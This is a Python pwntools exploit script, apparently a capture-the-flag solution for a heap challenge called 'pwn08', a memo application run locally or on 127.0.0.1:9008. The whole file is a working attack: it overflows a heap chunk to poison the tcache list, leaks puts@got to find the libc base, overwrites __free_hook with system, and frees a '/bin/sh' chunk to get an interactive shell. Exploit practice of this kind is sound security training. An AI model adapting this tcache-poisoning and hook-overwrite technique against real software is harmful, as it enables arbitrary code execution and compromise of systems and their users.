#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./file/pwn08"
libc = ELF("./file/libc-2.27.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("127.0.0.1", 9008)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
    loadsym
    b *command+338
    c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# function
def add(index, size):
    p.recvuntil(b'command?: ')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.sendline(str(index))
    p.recvuntil(b':')
    p.sendline(str(size))

def edit(index, memo):
    p.recvuntil(b'command?: ')
    p.sendline(b'2')
    p.recvuntil(b':')
    p.sendline(str(index))
    p.recvuntil(b':')
    p.sendline(memo)

def view(index):
    p.recvuntil(b'command?: ')
    p.sendline(b'3')
    p.recvuntil(b':')
    p.sendline(str(index))
    return p.recv()

def delete(index: int):
    p.recvuntil(b'command?: ')
    p.sendline(b'9')
    p.recvuntil(b':')
    p.sendline(str(index))


p.recvuntil("Welcome to memo application!!!")

# libc leak
add(0, 0x10)
add(1, 0x10)
add(2, 0x10)
delete(2) # tcache -> 2
delete(1) # tcache -> 1 -> 2
payload = b'A' * 0x10 # buf for index 0
payload += p64(0) + p64(0x21) # border NULL + size + any bit
payload += p64(elf.got['puts']) # tcache -> 1(puts@got) -> 2
edit(0, payload)
add(1, 0x10)
add(2, 0x10)
view(2)
puts_got = int.from_bytes(p.recv(6), 'little')
log.info("puts_got: 0x{:08x}".format(puts_got))
libc_base = puts_got - libc.sym['puts']
log.info("libc_base: 0x{:08x}".format(libc_base))

# overwrite __free_hook
add(3, 0x20)
add(4, 0x20)
add(5, 0x20)
delete(5) # tcache -> 5
delete(4) # tcache -> 4 -> 5
payload = b'B' * 0x20
payload += p64(0) + p64(0x31)
payload += p64(libc_base + libc.sym['__free_hook']) # tcache -> 4(__free_hook) -> 5
edit(3, payload)
add(4, 0x20) # tcache -> 4(__free_hook)
add(5, 0x20)
edit(5, p64(libc_base + libc.sym['system']))
edit(3, '/bin/sh')
delete(3)

p.interactive()
